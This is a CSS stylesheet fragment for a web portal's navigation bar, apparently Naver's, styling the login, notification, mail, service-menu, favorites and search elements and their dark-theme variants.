					.gnb_my_li .gnb_my_content:after{display:block;clear:both;content:''}
					.gnb_my_li .gnb_my_content .gnb_img_area{float:left;position:relative;display:block;width:80px;margin: 1px 0 0 1px;}
					.gnb_my_li .gnb_my_content .gnb_img_area img{vertical-align:top}
					.gnb_my_li .gnb_my_content .gnb_mask{position:absolute;top:0;left:0;display:block;width:80px;height:80px;background-position:-70px -60px}
					.gnb_my_li .gnb_my_content .gnb_change{position:absolute;bottom:-2px;left:-2px;display:block;width:28px;height:28px;background-position:-140px 0px}
					.gnb_my_li .gnb_my_content .gnb_change:hover{background-position:-140px -30px}
					.gnb_my_li .gnb_my_content .gnb_txt_area{float:left;width:210px;margin:0 0 0 10px}
					.gnb_longid1 .gnb_my_content .gnb_txt_area{/* width:210px; */}
					.gnb_longid2 .gnb_my_content .gnb_txt_area{width:235px}
					.gnb_my_li .gnb_my_content .gnb_account{margin-bottom:3px 0 1px;font-size:0}
					.gnb_my_li .gnb_my_content .gnb_name{color:#666;font-size:14px}
					.gnb_my_li .gnb_my_content .gnb_name a{display:inline-block;vertical-align:top;font-weight:bold;color:#222 !important}
					.gnb_my_li .gnb_my_content a.gnb_mail_address{margin-left:1px;font-family:tahoma;color:#666 !important;font-size:12px}
					.gnb_my_li .gnb_my_content .gnb_edit_lst{zoom:1;margin-top:7px !important}
					.gnb_my_li .gnb_my_content .gnb_edit_lst:after{display:block;clear:both;content:''}
					.gnb_my_li .gnb_my_content .gnb_edit_lst li{float:left;padding-left:6px;margin-left:5px;background-position:-290px -25px}
					.gnb_my_li .gnb_my_content .gnb_edit_lst li.gnb_info{padding-left:0;margin-left:0;background:none}
					.gnb_my_li .gnb_my_content .gnb_edit_lst a{color:#666 !important;letter-spacing:-1px}
					.gnb_my_li .gnb_my_content .gnb_membership {display: inline-block;margin-right: 5px;margin-left: 1px;padding-right: 8px;background-position: -287px -403px;}
					.gnb_my_li .gnb_my_content .gnb_pay_check{height:16px;margin:7px -4px 0 0 !important}
					@media screen and (min-width: 0\0) { .gnb_my_li .gnb_my_content .gnb_pay_check{margin-top:17px} }
					.gnb_my_li .gnb_my_content .gnb_pay_check em{display:inline-block;width:16px;height:16px;background-position:-300px -309px;margin:0 4px 0 0;overflow:hidden;font-size:0;line-height:0;vertical-align:top}
					.gnb_my_li .gnb_my_content .gnb_pay_check a{font-size:14px;letter-spacing:-1px;line-height:16px;vertical-align:top}
					.gnb_my_li .gnb_my_content .gnb_pay_check span{font-weight: bold;}
					.gnb_my_li .gnb_my_content .gnb_pay_check strong{font-family:tahoma;letter-spacing:0;vertical-align:top;}
					.gnb_my_li .gnb_my_content .gnb_pay_check a, .gnb_my_li .gnb_my_content .gnb_pay_check span, .gnb_my_li .gnb_my_content .gnb_pay_check strong{font-size:12px;color:#222 !important}
					#gnb .gnb_my_li .gnb_my_community{clear:both;zoom:1}
					#gnb .gnb_my_li .gnb_my_community:after{display:block;clear:both;content:''}
					#gnb .gnb_my_li .gnb_my_community a{float:left;width:106px;margin-right: 0;border-right:1px solid #ebebeb}
					#gnb .gnb_my_li .gnb_my_community a.gnb_pay{width:102px;border-right:0;line-height:0}
					#gnb .gnb_my_li .gnb_my_community a.gnb_pay span{display:inline-block;width:41px;height:16px;background-position:-300px -334px;margin:11px auto 0;font-size:0;line-height:0}
					#gnb .gnb_my_li .gnb_my_community a:active, #gnb .gnb_my_li .gnb_my_community a:focus, #gnb .gnb_my_li .gnb_my_community a:visited{text-decoration:none !important}
					#gnb .gnb_my_li .gnb_my_community a:hover{text-decoration:underline !important}
					#gnb .gnb_my_lyr.gnb_longid1 .gnb_my_community a{/*width:105px;*/}
					#gnb .gnb_my_lyr.gnb_longid1 .gnb_my_community a.gnb_pay{/* width:106px;*/}
					#gnb .gnb_my_lyr.gnb_longid2 .gnb_my_community a{width:115px}
					#gnb .gnb_my_lyr.gnb_longid2 .gnb_my_community a.gnb_pay{width:116px}
					#gnb.gnb_one .gnb_my_community a, #gnb.gnb_one_small .gnb_my_community a{margin-right: 0 !important;}
					.gnb_notice_li a.gnb_notice{display:block;width:15px;height:17px;padding:7px 9px 4px;text-decoration:none !important}
					.gnb_notice_li a.gnb_notice .gnb_ico_num{left:1px;top:0}
					.gnb_notice_li a.gnb_notice .gnb_icon{display:block;width:15px;height:17px;background-position:-3px -60px}
					.gnb_notice_li a.gnb_notice:hover .gnb_icon{background-position:-38px -60px;text-decoration:none !important}
					.gnb_notice_li .gnb_notice_lyr{display:none;position:absolute;top:26px;right:-7px;width:297px;height:330px;padding:9px 4px 4px;background-position:-2px -584px;z-index:10;overflow:hidden}
					.gnb_notice_li .svc_scroll{height:291px;overflow:scroll;overflow-x:hidden;position:relative;zoom:1}
					.gnb_notice_li .svc_panel{width:100%;height:330px;overflow:hidden}
					.gnb_notice_li .svc_head{position:relative;height:36px;padding-left:15px;line-height:20px;border-bottom:1px solid #eaeaea;zoom:1}
					.gnb_notice_li .svc_head .gnb_tit{color:#6b6d70;margin-right:1px;line-height:36px}
					.gnb_notice_li .svc_head .task_right{position:absolute;right:8px;top:8px;font-size:0}
					.gnb_notice_li .svc_head .task_right button{height:20px;padding:0 6px;margin-left:4px;border:1px solid #ddd;color:#888;background-color:#fff;font-family:'나눔고딕', NanumGothic;font-size:12px;letter-spacing:-1px;line-height:18px;*line-height:16px;overflow:visible}
					.gnb_notice_li .svc_list .gnb_btn_remove i, .gnb_notice_li .svc_list .gnb_btn_remove span, .gnb_notice_li .svc_noti .gnb_ico_mail, .gnb_notice_li .svc_blank .svc_msg_box, .gnb_notice_li .svc_blank .gnb_v_guide{display:inline-block;*display:inline;*zoom:1}
					.gnb_notice_li .svc_list{margin-top:-1px}
					.gnb_notice_li .svc_list li{position:relative;padding:7px 34px 7px 15px;border-top:1px solid #eaeaea;line-height:18px}
					.gnb_notice_li .svc_list .gnb_new{background:#ffffd8}
					.gnb_notice_li .svc_list .gnb_unread .gnb_subject{color:#444}
					.gnb_notice_li .svc_list .gnb_unread .d_cnt{color:#ff630e}
					.gnb_notice_li .svc_list .gnb_unread a:hover .gnb_subject, .gnb_notice_li .svc_list .gnb_unread .gnb_unread a:hover .d_cnt{color:#390}
					.gnb_notice_li .svc_list .gnb_unread .svc_name{color:#444}
					.gnb_notice_li .svc_list a.gnb_list_cover{text-decoration:none !important;display:block;position:relative;zoom:1}
					.gnb_notice_li .svc_list a:hover .gnb_subject{text-decoration:underline}
					.gnb_notice_li .svc_list .gnb_subject{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;color:#adadad}
					.gnb_notice_li .svc_list .d_cnt{font-family:tahoma;font-size:10px}
					.gnb_notice_li .svc_list .gnb_info{color:#adadad}
					.gnb_notice_li .svc_list .svc_name{margin-right:3px;color:#adadad}
					.gnb_notice_li .svc_list .cchr{margin-right:3px}
					.gnb_notice_li .svc_list .dona{position:absolute;top:8px;right:34px;text-decoration:underline}
					.gnb_notice_li .svc_list .dona a{color:#adadad}
					.gnb_notice_li .svc_list .dona a:hover{color:#390}
					.gnb_notice_li .svc_list .gnb_ico_mail{width:14px;height:15px;font-size:0;line-height:0;color:#fff;vertical-align:top}
					.gnb_notice_li .svc_list .gnb_ico_mail.gnb_yes{background-position:-245px -17px}
					.gnb_notice_li .svc_list .gnb_ico_mail.gnb_no{background-position:-245px 4px}
					.gnb_notice_li .svc_list .gnb_btn_remove{position:absolute;right:4px;top:50%;z-index:100;margin-top:-13px;padding:10px;line-height:6px;font-size:0;background:none !important;border:0 !important}
					.gnb_notice_li .svc_list .gnb_btn_remove span, .gnb_notice_li .svc_list .gnb_btn_remove i{display:block !important;width:7px;height:7px;font-size:0;line-height:0;color:transparent;white-space:nowrap;overflow:hidden;vertical-align:top;background-position:-175px 0}
					.gnb_notice_li .svc_blank{position:absolute;top:104px;left:0;width:100%;white-space:nowrap;height:100px;font-size:0;text-align:center}
					.gnb_notice_li .svc_blank .svc_msg_box{white-space:normal;font-size:12px;width:100%}
					.gnb_notice_li .svc_blank .gnb_tit{display:block;color:#2f3743;font-size:14px;margin:0 0 15px}
					.gnb_notice_li .svc_blank .gnb_tit strong{font-weight:normal;color:#390}
					.gnb_notice_li .svc_blank .gnb_desc{line-height:19px;color:#2f3743;margin-bottom:7px}
					.gnb_notice_li .svc_blank .gnb_desc a, .gnb_notice_li .svc_blank .gnb_link{color:#390;text-decoration:underline}
					.gnb_notice_li .svc_blank .gnb_v_guide{vertical-align:middle;height:100%;width:0}
					.gnb_notice_li .svc_blank .gnb_link_wrap{text-align:center}
					.gnb_notice_li .svc_blank .gnb_link_wrap .gnb_link{display:block;width:40px;margin:0 auto !important;text-align:center}
					.gnb_notice_li .svc_loading{background:url(http://ssl.pstatic.net/static/www/2014/loading.gif) no-repeat #fff center center;position:absolute;top:33px;left:0;width:100%;height:245px}
					.gnb_notice_li .gnb_error{position:absolute;top:81px;left:2px;width:100%;color:#444;text-align:center}
					.gnb_notice_li .gnb_error .gnb_ico_error{display:inline-block;width:57px;height:57px;background-position:-280px -190px}
					.gnb_notice_li .gnb_error .gnb_tit{font-size:14px;margin:15px 0 11px}
					.gnb_notice_li .gnb_error .gnb_desc{margin-bottom:13px;line-height:18px}
					.gnb_notice_li .gnb_error .gnb_link{text-decoration:underline}
					.gnb_ly_alert{position:absolute;top:110px;left:13px;background-color:#fff;border:1px solid #b7b9bc;width:260px;padding:34px 0 20px;zoom:1;z-index:100}
					.gnb_ly_alert .gnb_msg{text-align:center;line-height:17px;margin-bottom:14px;color:#2f3743}
					.gnb_.ly_alert .gnb_btn_close{position:absolute;right:2px;top:0;*overflow:visible}
					.gnb_ly_alert .gnb_btns{text-align:center}
					.gnb_ly_alert .gnb_btns button{height:27px;line-height:27px;*line-height:22px;font-weight:bold;font-size:12px;padding:0 8px;color:#2f3743;border:1px solid #ddd;background-color:white}
					.gnb_ly_alert .gnb_btns button:first-child{margin-right:4px}
					.gnb_ly_alert .gnb_btn_close{position:absolute;right:2px;top:0;width:35px;border:0;background:none;cursor:pointer;border-radius:0;padding:10px}
					.gnb_ly_alert .gnb_btn_close i{display:block;width:15px;height:15px;font:0/0 a;color:transparent;white-space:nowrap;overflow:hidden;vertical-align:top;background-position:-240px -60px}
					.mail_li a.gnb_mail{display:block;width:20px;height:15px;padding:7px 9px 6px;text-decoration:none !important}
					.mail_li a.gnb_mail .gnb_icon{display:block;width:20px;height:15px;background-position:0px -95px}
					.mail_li a.gnb_mail:hover .gnb_icon{background-position:-35px -95px;text-decoration:none !important}
					.mail_li .gnb_ico_num{left:6px;top:0}
					.gnb_service_li{margin-right:0}
					.gnb_service_li a.gnb_service{display:block;width:16px;height:16px;padding:7px 9px 5px}
					.gnb_service_li a.gnb_service .gnb_icon{display:block;width:16px;height:16px;background-position:-2px -130px}
					.gnb_service_li a.gnb_service:hover .gnb_icon{background-position:-37px -130px;text-decoration:none !important}
					.gnb_service_li .gnb_service_lyr{display:none;position:absolute;top:27px;right:-7px;z-index:10}
					.gnb_favorite_search{width:301px;letter-spacing:-1px}
					.gnb_response .gnb_favorite_search{display:none}
					.gnb_favorite_area{height:93px;padding:8px 4px 0;background-position:0 0}
					.gnb_favorite_lstwrp{position:relative;padding:22px 1px 15px 15px;border-bottom:1px solid #ebebeb}
					.gnb_favorite_lstwrp .gnb_my_interface{top:3px !important;right:3px !important}
					.gnb_first_visit{position:absolute;top:0;left:0;width:293px;height:92px;background-position:0 -310px;z-index:200}
					.gnb_first_visit .gnb_close{position:absolute;top:0;right:0;display:block;width:32px;height:32px}
					.gnb_favorite_lst{zoom:1}
					.gnb_favorite_lst:after{display:block;clear:both;content:''}
					.gnb_favorite_lst li{float:left;width:65px;text-align:center;white-space:nowrap}
					.gnb_favorite_lst a{display:inline-block;text-align:center;font-weight:bold}
					.gnb_favorite_lst .gnb_add a{display:block;test-align:center;}
					.gnb_favorite_lst .gnb_add a span.ic_add{display:block;width:36px;height:36px;margin:0 auto 4px;background-image: url(http://ssl.pstatic.net/static/common/gnb/one/sp_gnb_4b16e6.png);background-position: 0px 0px;background-repeat: no-repeat;width: 36px;height: 36px;vertical-align: top;}
					.gnb_favorite_lst .gnb_add a:hover span.ic_add{background-image: url(http://ssl.pstatic.net/static/common/gnb/one/sp_gnb_4b16e6.png);background-position: -42px 0px;background-repeat: no-repeat;width: 36px;height: 36px;vertical-align: top;}
					.gnb_favorite_lst img{display:block;margin:0 auto 4px;vertical-align:top}
					.gnb_search_area{position:relative;z-index:200;padding:18px 4px 17px;background-position:-301px 0;background-repeat:repeat-y}
					.gnb_search_box{position:relative;z-index:101;margin:0 12px 16px 0;padding-left:10px;display:block;width:270px;height:35px;background-position:10px -190px}
					.gnb_search_box.over{background-position:10px -230px}
					.gnb_search_box.fcs{background-position:10px -270px}
					.gnb_search_box.fcs input{width:200px;font-size:16px;font-weight:bold;color:#444;outline:0}
					.gnb_search_box input{float:left;display:block;width:210px;height:22px;margin-top:6px;padding-left:10px;font-family:'나눔고딕',NamumGothic;letter-spacing:-1px;color:#adadad;font-size:13px;border:0;line-height:22px;background:transparent}
					.gnb_search_box .gnb_del_txt{position:absolute;top:8px;right:32px;display:block;width:17px;height:17px;background-position:-190px 0px}
					.gnb_search_box .gnb_del_txt:hover{background-position:-190px -20px}
					.gnb_search_box .gnb_pop_input{position:absolute;top:34px;left:10px;width:268px;height:170px;*height:172px;border:1px solid #cbc5c5;border-top:0;background:#fff;overflow-x:hidden;overflow-y:scroll;z-index:110}
					.gnb_search_box .gnb_pop_lst{padding:4px 0 2px}
					.gnb_search_box .gnb_pop_lst a{display:block;padding:6px 0 6px 10px;font-weight:bold}
					.gnb_search_box .gnb_pop_lst .on{background-color:#f5f5f5}
					.gnb_search_lstwrp{zoom:1;height:118px;padding-left:12px}
					.gnb_search_lstwrp:after{display:block;clear:both;content:''}
					.gnb_search_lstwrp .gnb_search_lst{float:left;width:69px;border-left:1px solid #eaeaea}
					.gnb_search_lstwrp .gnb_search_lst.gnb_first{width:64px;border:0}
					.gnb_search_lstwrp li{padding:12px 0 0 8px}
					.gnb_search_lstwrp li.gnb_first{font-weight:bold;padding-top:0}
					.gnb_search_lstwrp li a{display:inline-block;vertical-align:top}
					.gnb_banner{height:47px;margin:0;padding:0 18px;background-position:-301px 0;background-repeat:repeat-y}
					.gnb_banner .gnb_service_event{display:inline-block;border-top:1px solid #ebebeb}
					.gnb_linkwrp{padding:0 4px 4px;background-position:-602px 0}
					a.gnb_service_all:hover, a.gnb_service_all:visited, a.gnb_service_all:active, a.gnb_service_all:focus{text-decoration:none}
					.gnb_svc_more{display:none;position:absolute;top:4px;right:303px;width:589px;overflow:hidden;zoom:1;z-index:1000}
					.gnb_svc_more:after{display:block;clear:both;content:''}
					.gnb_response .gnb_svc_more{right:2px}
					.gnb_bg_top{height:6px;background:url(http://ssl.pstatic.net/static/common/gnb/2014/bg_svclyr1_v2.png) no-repeat}
					.gnb_bg_btm{position:relative;height:6px;background:url(http://ssl.pstatic.net/static/common/gnb/2014/bg_svclyr1_v2.png) no-repeat -1282px 0}
					.gnb_svc_more .gnb_svc_hd{position:relative;padding:0 18px 2px 23px;letter-spacing:-1px;background:url(http://ssl.pstatic.net/static/common/gnb/2014/bg_svclyr1_v2.png) repeat-y -641px 0}
					.gnb_svc_more .gnb_svc_hd .gnb_svc_tit{display:block;padding:12px 0 13px;border-bottom:1px solid #ebebeb;font-size:14px;color:#222}
					.gnb_svc_more .gnb_svc_hd .link{position:absolute;top:14px;right:19px;font-size:12px;color:#444}
					.gnb_svc_more .gnb_svc_hd .link a{color:#444 !important;line-height:16px !important}
					.gnb_svc_more .gnb_svc_lstwrp{position:relative;height:283px;overflow:hidden;padding:15px 15px 0 20px;letter-spacing:-1px;background:url(http://ssl.pstatic.net/static/common/gnb/2014/bg_svclyr1_v2.png) repeat-y -641px 0;zoom:1}
					.gnb_svc_more .gnb_svc_lstwrp:after{display:block;clear:both;content:''}
					.gnb_svc_more .gnb_svc_lstwrp li{height:15px;margin-bottom:5px;color:#6b6d70;white-space:nowrap;line-height:15px}
					.gnb_svc_more .gnb_svc_lstwrp li.gnb_event label{color:#444;font-weight:bold}
					.gnb_svc_more .gnb_svc_lstwrp li.gnb_event em.ic_gnb_new{display:inline-block;width:11px;height:11px;background-position:-215px 0px;margin:2px 0 0 4px;font-size:0;line-height:0;vertical-align:top}
					@media screen and (min-width: 0\0) { .gnb_svc_more .gnb_svc_lstwrp li.gnb_event em.ic{margin-top:3px} }
					.gnb_svc_more .gnb_svc_lstwrp .gnb_input_check{width:13px;height:13px;margin:2px 3px 0 3px;padding:0;vertical-align:top;-webkit-appearance:checkbox;}
					.gnb_svc_more .gnb_svc_lstwrp label{vertical-align:0px}
					.gnb_svc_more .gnb_svc_lstwrp .gnb_disabled strong{color:#a8acb0}
					.gnb_svc_more .gnb_svc_lstwrp .gnb_disabled li{color:#cbcbcb}
					.gnb_svc_more .gnb_svc_lst1{float:left;width:328px;height:280px}
					.gnb_svc_more .gnb_svc_lst1 ul{float:left;width:102px;min-height:260px;padding:5px 0 0 10px;border-left:1px solid #eee}
					.gnb_svc_more .gnb_svc_lst1 ul.gnb_first{padding-left:0;border:0}
					.gnb_svc_more .svc_lst2{float:left;position:relative;width:221px;border:1px solid #eee;background:#fbfbfb;zoom:1}
					.gnb_svc_more .svc_lst2:after{display:block;clear:both;content:''}
					.gnb_svc_more .svc_spc{float:left;position:relative;width:100px;min-height:254px;padding:9px 0 0 10px}
					.gnb_svc_more .svc_spc.gnb_first{border-right:1px solid #eee}
					.gnb_svc_more .svc_spc strong{height:20px;color:#2f3743;line-height:16px}
					.gnb_svc_more .svc_spc a:visited{color:#2f3743}
					.gnb_svc_more .svc_spc ul{padding:8px 0}
					.gnb_svc_more .svc_spc li{margin-bottom:0;padding-bottom:5px;color:#848689}
					.gnb_svc_more .svc_stroy{width:89px;margin-top:-5px;padding:12px 0 0;border-top:1px solid #eee}
					.gnb_svc_more .svc_btns{position:relative;height:33px;overflow:hidden;padding-top:5px;line-height:normal}
					.gnb_svc_more .svc_btnwrp{position:relative;*height:39px;background:url(http://ssl.pstatic.net/static/common/gnb/2014/bg_svclyr1_v2.png) repeat-y -641px 0;padding:0 2px 0 4px}
					.gnb_svc_more .svc_btnwrp button{display:inline-block;width:60px;height:25px;border:0;vertical-align:top}
					.gnb_svc_more .svc_btnwrp .gnb_save{background-position:0 -160px}
					.gnb_svc_more .svc_btnwrp .gnb_close{margin-left:1px;background-position:-65px -160px}
					.gnb_svc_more .svc_btnwrp .gnb_return{position:absolute;top:5px;left:15px;background-position:-130px -160px}
					.gnb_type2 .gnb_notice_li a.gnb_notice .gnb_icon{background-position:-155px -120px}
					.gnb_type2 .gnb_notice_li a.gnb_notice:hover .gnb_icon{background-position:-155px -140px}
					.gnb_type2 .gnb_service_li .gnb_service .gnb_icon{background-position:-200px -120px}
					.gnb_type2 .gnb_service_li .gnb_service:hover .gnb_icon{background-position:-200px -140px}
					.gnb_type2 .mail_li a.gnb_mail .gnb_icon{background-position:-175px -120px}
					.gnb_type2 .mail_li a.gnb_mail:hover .gnb_icon{background-position:-175px -140px}
					.gnb_dark .gnb_my_li .gnb_my .gnb_name, .gnb_dark .gnb_login_li .gnb_btn_login .gnb_txt{color:#fff}
					.gnb_dark .gnb_notice_li a.gnb_notice .gnb_icon{background-position:-220px -140px}
					.gnb_dark .gnb_notice_li a.gnb_notice:hover .gnb_icon{background-position:-220px -120px}
					.gnb_dark .mail_li a.gnb_mail .gnb_icon{background-position:-238px -141px}
					.gnb_dark .mail_li a.gnb_mail:hover .gnb_icon{background-position:-238px -121px}
					.gnb_dark .gnb_service_li .gnb_service .gnb_icon{background-position:-261px -140px}
					.gnb_dark .gnb_service_li .gnb_service:hover .gnb_icon{background-position:-261px -120px}
					.gnb_dark_type2 .gnb_my_li .gnb_my .gnb_name, .gnb_dark_type2 .gnb_login_li .gnb_btn_login .gnb_txt{color:#fff}
					.gnb_dark_type2 .gnb_notice_li a.gnb_notice .gnb_icon{background-position:-220px -120px}
					.gnb_dark_type2 .gnb_notice_li a.gnb_notice:hover .gnb_icon{background-position:-220px -140px}
					.gnb_dark_type2 .mail_li a.gnb_mail .gnb_icon{background-position:-238px -121px}
					.gnb_dark_type2 .mail_li a.gnb_mail:hover .gnb_icon{background-position:-238px -141px}
					.gnb_dark_type2 .gnb_service_li .gnb_service .gnb_icon{background-position:-261px -120px}
					.gnb_dark_type2 .gnb_service_li .gnb_service:hover .gnb_icon{background-position:-261px -140px;}
					.gnb_dark .gnb_notice_li a.gnb_notice, .gnb_dark_type2 .gnb_notice_li a.gnb_notice {width: 17px;height: 19px;padding: 6px 8px 3px;}
					.gnb_dark .gnb_notice_li a.gnb_notice .gnb_icon, .gnb_dark_type2 .gnb_notice_li a.gnb_notice .gnb_icon {width: 17px;height: 19px;}
					.gnb_dark .mail_li a.gnb_mail, .gnb_dark_type2 .mail_li a.gnb_mail {width: 22px;height: 16px;padding: 7px 8px 4px;}
					.gnb_dark .mail_li a.gnb_mail .gnb_icon, .gnb_dark_type2 .mail_li a.gnb_mail .gnb_icon {width: 22px;height: 16px;}
					.gnb_dark .gnb_service_li a.gnb_service, .gnb_dark_type2 .gnb_service_li a.gnb_service {width: 18px;height: 18px;padding: 6px 8px 4px;}
					.gnb_dark .gnb_service_li .gnb_service .gnb_icon, .gnb_dark_type2 .gnb_service_li .gnb_service .gnb_icon {width: 18px;height: 18px;}
					#gnb.gnb_one .gnb_my_li .gnb_my .gnb_name, #gnb.gnb_one_small .gnb_my_li .gnb_my .gnb_name, #gnb.gnb_one .gnb_login_li .gnb_btn_login .gnb_txt, #gnb.gnb_one_small .gnb_login_li .gnb_btn_login .gnb_txt{color:#fff}
					#gnb.gnb_one .gnb_login_li, #gnb.gnb_one_small .gnb_login_li {height: 28px;}
					#gnb.gnb_one .gnb_login_li .gnb_btn_login, #gnb.gnb_one_small .gnb_login_li .gnb_btn_login, #gnb.gnb_one .gnb_login_li .gnb_bg, #gnb.gnb_one_small .gnb_login_li .gnb_bg, #gnb.gnb_one .gnb_login_li .gnb_bdr, #gnb.gnb_one_small .gnb_login_li .gnb_bdr, #gnb.gnb_one .gnb_login_li .gnb_txt, #gnb.gnb_one_small .gnb_login_li .gnb_txt {width: 53px;height: 23px;}
					#gnb.gnb_one .gnb_login_li .gnb_btn_login .gnb_txt, #gnb.gnb_one_small .gnb_login_li .gnb_btn_login .gnb_txt {top: -1px;width: 53px;height: 23px;line-height: 28px;font-size: 11px;}
					#gnb.gnb_one .gnb_login_li, #gnb.gnb_one_small .gnb_login_li, #gnb.gnb_one .gnb_my_li, #gnb.gnb_one_small .gnb_my_li, #gnb.gnb_one .gnb_notice_li, #gnb.gnb_one_small .gnb_notice_li, #gnb.gnb_one .mail_li, #gnb.gnb_one_small .mail_li, #gnb.gnb_one .gnb_service_li, #gnb.gnb_one_small .gnb_service_li{margin-right: 0;margin-left: 0; background: url(http://ssl.pstatic.net/static/common/gnb/bg_one_line.png) repeat-y right 0;}
					#gnb.gnb_one .gnb_login_li a, #gnb.gnb_one_small .gnb_login_li a, #gnb.gnb_one .gnb_my_li a, #gnb.gnb_one_small .gnb_my_li a, #gnb.gnb_one .gnb_notice_li a, #gnb.gnb_one_small .gnb_notice_li a, #gnb.gnb_one .mail_li a, #gnb.gnb_one_small .mail_li a, #gnb.gnb_one .gnb_service_li a, #gnb.gnb_one_small .gnb_service_li a {margin-right: 1px;}
					#gnb.gnb_one .gnb_login_li.hover .gnb_service, #gnb.gnb_one_small .gnb_login_li.hover .gnb_service, #gnb.gnb_one .gnb_login_li.hover .gnb_notice, #gnb.gnb_one_small .gnb_login_li.hover .gnb_notice, #gnb.gnb_one .gnb_login_li.hover .gnb_mail, #gnb.gnb_one_small .gnb_login_li.hover .gnb_mail, #gnb.gnb_one .gnb_login_li.hover .gnb_service, #gnb.gnb_one_small .gnb_login_li.hover .gnb_service, #gnb.gnb_one .gnb_my_li.hover .gnb_service, #gnb.gnb_one_small .gnb_my_li.hover .gnb_service, #gnb.gnb_one .gnb_my_li.hover .gnb_notice, #gnb.gnb_one_small .gnb_my_li.hover .gnb_notice, #gnb.gnb_one .gnb_my_li.hover .gnb_mail, #gnb.gnb_one_small .gnb_my_li.hover .gnb_mail, #gnb.gnb_one .gnb_my_li.hover .gnb_service, #gnb.gnb_one_small .gnb_my_li.hover .gnb_service, #gnb.gnb_one .gnb_notice_li.hover .gnb_service, #gnb.gnb_one_small .gnb_notice_li.hover .gnb_service, #gnb.gnb_one .gnb_notice_li.hover .gnb_notice, #gnb.gnb_one_small .gnb_notice_li.hover .gnb_notice, #gnb.gnb_one .gnb_notice_li.hover .gnb_mail, #gnb.gnb_one_small .gnb_notice_li.hover .gnb_mail, #gnb.gnb_one .gnb_notice_li.hover .gnb_service, #gnb.gnb_one_small .gnb_notice_li.hover .gnb_service, #gnb.gnb_one .mail_li.hover .gnb_service, #gnb.gnb_one_small .mail_li.hover .gnb_service, #gnb.gnb_one .mail_li.hover .gnb_notice, #gnb.gnb_one_small .mail_li.hover .gnb_notice, #gnb.gnb_one .mail_li.hover .gnb_mail, #gnb.gnb_one_small .mail_li.hover .gnb_mail, #gnb.gnb_one .mail_li.hover .gnb_service, #gnb.gnb_one_small .mail_li.hover .gnb_service, #gnb.gnb_one .gnb_service_li.hover .gnb_service, #gnb.gnb_one_small .gnb_service_li.hover .gnb_service, #gnb.gnb_one .gnb_service_li.hover .gnb_notice, #gnb.gnb_one_small .gnb_service_li.hover .gnb_notice, #gnb.gnb_one .gnb_service_li.hover .gnb_mail, #gnb.gnb_one_small .gnb_service_li.hover .gnb_mail, #gnb.gnb_one .gnb_service_li.hover .gnb_service, #gnb.gnb_one_small .gnb_service_li.hover .gnb_service {background: url(http://ssl.pstatic.net/static/common/gnb/bg_one_hover.png) repeat 0 0;}
					#gnb.gnb_one .gnb_my_li .gnb_my .gnb_name, #gnb.gnb_one_small .gnb_my_li .gnb_my .gnb_name{margin:0 0 0 1px;}
					#gnb.gnb_one .gnb_notice_li a.gnb_notice, #gnb.gnb_one_small .gnb_notice_li a.gnb_notice{width:17px;height:19px}
					#gnb.gnb_one .gnb_notice_li a.gnb_notice .gnb_icon, #gnb.gnb_one_small .gnb_notice_li a.gnb_notice .gnb_icon{width:17px;height:19px;background-position:-284px -119px}
					#gnb.gnb_one .gnb_notice_li a.gnb_notice:hover .gnb_icon, #gnb.gnb_one_small .gnb_notice_li a.gnb_notice:hover .gnb_icon{background-position:-284px -119px}
					#gnb.gnb_one .mail_li a.gnb_mail, #gnb.gnb_one_small .mail_li a.gnb_mail{width:21px;height:17px}
					#gnb.gnb_one .mail_li a.gnb_mail .gnb_icon, #gnb.gnb_one_small .mail_li a.gnb_mail .gnb_icon{width:21px;height:17px;background-position:-302px -120px}
					#gnb.gnb_one .mail_li a.gnb_mail:hover .gnb_icon, #gnb.gnb_one_small .mail_li a.gnb_mail:hover .gnb_icon{background-position:-302px -120px}
					#gnb.gnb_one .gnb_service_li .gnb_service, #gnb.gnb_one_small .gnb_service_li .gnb_service{width:17px;height:17px}
					#gnb.gnb_one .gnb_service_li .gnb_service .gnb_icon, #gnb.gnb_one_small .gnb_service_li .gnb_service .gnb_icon{width:17px;height:17px;background-position:-324px -120px}
					#gnb.gnb_one .gnb_service_li .gnb_service:hover .gnb_icon, #gnb.gnb_one_small .gnb_service_li .gnb_service:hover .gnb_icon{background-position:-324px -120px}
					#gnb.gnb_one .gnb_my_lyr, #gnb.gnb_one_small .gnb_my_lyr, #gnb.gnb_one .gnb_notice_lyr, #gnb.gnb_one_small .gnb_notice_lyr, #gnb.gnb_one .gnb_service_lyr, #gnb.gnb_one_small .gnb_service_lyr {right: 7px;}
					#gnb.gnb_one .gnb_ico_num, #gnb.gnb_one_small .gnb_ico_num{width:34px;top:10px;right:3px;left:auto;vertical-align:top}
					#gnb.gnb_one .gnb_ico_num .gnb_ico_new, #gnb.gnb_one_small .gnb_ico_num .gnb_ico_new{vertical-align:top;height:13px;background-position:-332px -60px;}
					#gnb.gnb_one .gnb_ico_num .gnb_count, #gnb.gnb_one_small .gnb_ico_num .gnb_count {height: 13px;padding: 0 6px 0 2px;background-position: 100% -60px;font-size: 10px;font-weight: normal;}
					#gnb.gnb_one .gnb_ico_num .plus, #gnb.gnb_one_small .gnb_ico_num .plus{margin:1px 0 0 2px}
					#gnb.gnb_one .ico_arrow{top:48px}
					#gnb.gnb_one .gnb_my_lyr, #gnb.gnb_one .gnb_notice_lyr{top:47px}
					#gnb.gnb_one .gnb_service_lyr{top:48px;}
					#gnb.gnb_one .gnb_login_li{padding:16px 21px 10px 1px;}
					#gnb.gnb_one .gnb_my_li{padding:12px 20px 12px 2px}
					#gnb.gnb_one .gnb_my_li .ico_arrow{top:34px}
					#gnb.gnb_one .gnb_notice_li a.gnb_notice{padding:18px 19px 17px 19px}
					#gnb.gnb_one .mail_li a.gnb_mail{padding:19px 17px 18px 17px}
					#gnb.gnb_one .gnb_service_li .gnb_service{padding:19px 19px 18px 19px}
					#gnb.gnb_one_small .ico_arrow{top:33px}
					#gnb.gnb_one_small .gnb_my_lyr, #gnb.gnb_one_small .gnb_notice_lyr{top:32px}
					#gnb.gnb_one_small .gnb_service_lyr{top:33px}
					#gnb.gnb_one_small .gnb_login_li{padding:7px 12px 4px 2px}
					#gnb.gnb_one_small .gnb_my_li{padding:5px 20px 4px 2px}
					#gnb.gnb_one_small .gnb_my_li .ico_arrow{top:27px}
					#gnb.gnb_one_small .gnb_notice_li a.gnb_notice{padding:10px 11px 10px 12px}
					#gnb.gnb_one_small .mail_li a.gnb_mail{padding:11px 10px 11px 9px}
					#gnb.gnb_one_small .gnb_service_li .gnb_service{padding:11px 12px 11px 11px}
